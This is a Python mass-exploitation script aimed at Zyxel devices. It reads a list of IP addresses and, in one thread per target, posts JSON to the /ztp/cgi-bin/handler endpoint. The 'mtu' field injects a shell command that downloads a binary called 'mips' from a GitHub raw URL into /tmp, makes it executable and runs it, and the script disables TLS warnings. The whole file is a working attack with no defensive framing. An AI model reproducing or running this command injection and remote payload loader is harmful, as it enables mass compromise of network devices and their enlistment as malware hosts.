import threading
import sys
import requests
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def read_ips(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines()]
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0",
    "Content-Type": "application/json",
}

data = {
    "command": "setWanPortSt",
    "proto": "dhcp",
    "port": "4",
    "vlan_tagged": "1",
    "vlanid": "5",
    "mtu": '; bash -c "cd /tmp;wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips;chmod 777 mips;./mips;"',
    "data": "hi",
}

class ZyxelThread(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = ip

    def run(self):
        try:
            url = f"https://{self.ip}:443/ztp/cgi-bin/handler"
            print(f"[ZyxelV2] Sending request to: {self.ip}:443")
            response = requests.post(url, headers=headers, data=json.dumps(data), timeout=5)
            if response.status_code == 200:
                print(f"[ZyxelV2] Success: {self.ip}")
            else:
                print(f"[ZyxelV2] Failed: {self.ip}, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[ZyxelV2] Error with {self.ip}: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py <ip_file>")
        sys.exit(1)

    ip_file = sys.argv[1]
    ips = read_ips(ip_file)

    for ip in ips:
        try:
            thread = ZyxelThread(ip)
            thread.start()
        except Exception as e:
            print(f"Error starting thread for {ip}: {e}")
